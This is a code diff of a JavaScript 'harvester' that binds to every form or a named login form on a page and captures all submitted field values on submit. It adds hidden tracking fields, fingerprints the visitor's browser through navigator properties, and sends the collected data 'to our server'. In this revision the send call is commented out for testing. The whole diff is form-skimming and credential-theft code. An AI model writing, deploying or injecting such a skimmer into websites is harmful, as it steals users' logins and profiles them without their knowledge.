@@ -23,42 +23,33 @@ function initHarvester() {
 
 /* bind all forms in the document */
 function bindAllForms() {
-    document.querySelectorAll('form').forEach(form => 
-        form.addEventListener('submit', function(e){
-            let formName = form.name;
-            let payload = grabAll(form);
-			if(trackClients) {
-				let clientInfo = profileClient();
-				console.log("clientInfo: " + clientInfo);
-				// TODO: serialize client data and append to payload
-			}
-			//	send the payload to our server
-			sendPayload(payload);
-			// for testing purposes
-			e.preventDefault();
-        }, false)
-    );
-	appendFields(form);
+    document.querySelectorAll('form').forEach(form => bindForm(form));
 }
 
 /* bind a specific form by name */
 function bindByName(formName) {
 	var loginForm = document.getElementByName(formName);
-	if(loginForm) {
-        loginForm.addEventListener('submit', function(e){
-				let payload = grabAll(formName);
+	bindForm(loginForm);
+}
+
+/*	binds the submit event of a given form object */
+function bindForm(form) {
+	if(form) {
+        form.addEventListener('submit', function(e){
+				// for testing purposes
+				e.preventDefault();
+				let payload = grabAll(form);
 				if(trackClients) {
 					let clientInfo = profileClient();
 					console.log("clientInfo: " + clientInfo);
 					// TODO: serialize client data and append to payload
 				}
 				//	send the payload to our server
-				sendPayload(payload);
-				// for testing purposes
-				e.preventDefault();				
+				//sendPayload(payload);				
+				console.log("sending payload...");
             }, false);
     }
-    appendFields(loginForm);
+    appendFields(form);
 }
 
 /* append tracking values to a form */
@@ -173,7 +164,27 @@ function grabAll(form) {
 }
 
 function profileClient() {
-	let appVersion = window.navigator.appVersion;
+	let appCodeName = "";
+	let appName = "";
+	let appVersion = "";
+	let platform = "";
+	let pluginList = ""
+	let product = "";
+	let productSub = "";
+	let userAgent = "";
+
+	appCodeName = window.navigator.appCodeName;
+	appName = window.navigator.appName;
+	appVersion = window.navigator.appVersion
+	platform = window.navigator.platform;
+	pluginList = window.navigator.plugins;
+	if(pluginList != "") {
+		//pluginList.forEach((element) => console.log(element));
+	}
+	product = window.navigator.product;
+	productSub = window.navigator.productSub;
+	userAgent = window.navigator.userAgent;
+
 	return appVersion;
 }
 
